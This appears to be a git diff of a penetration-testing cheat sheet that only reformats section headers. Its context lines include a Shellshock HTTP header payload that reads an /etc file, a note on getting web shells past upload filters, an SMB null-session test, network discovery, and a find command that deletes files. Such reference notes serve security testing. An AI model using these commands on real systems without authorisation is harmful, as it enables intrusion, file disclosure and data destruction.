@@ -103,7 +103,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 cat adwea-show-acl  | grep -oe  'line\s[0-9]\+' | uniq -c | sort -nr > result
 
 
- [ netstat ]
+[ netstat ]
 
 view listening sockets via netstat
 netstat -antp | grep sshd                                                       ** View socket opened by the SSH process on the machine.
@@ -554,11 +554,11 @@ root@kali:~/priv-escalation-scripts# while true
 
 
 
-37) [ locate ]
+[ locate ]
 locate [name]
 updatedb << update locate database
 
-38) [ find ]
+[ find ]
 # find /home/user -perm 777 -exec rm '{}' +                                     *** Be careful with this command
 # find /etc -iname "*.conf" -mtime -180 -print
 # find . -maxdepth 3 -type f -size +2M
@@ -1645,7 +1645,7 @@ enter multi line text here
 EOF
 
 
- [ echo multi line append ]
+[ echo multi line append ]
 
 
 echo "
@@ -3041,7 +3041,7 @@ $ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/
 
 
 
- [ bypass web shell upload filter ]
+[ bypass web shell upload filter ]
 
 
 try .php3 .php5 extensions
@@ -3509,7 +3509,7 @@ netdiscover -r 10.11.1.0/24                                                     
 
 
 
- [ rpcclient ]
+[ rpcclient ]
                                                                                 ** Linux tool used for executing client side MS -RPC functions.
 rpcclient -U “” [target IP address]                                             ** null session test
 
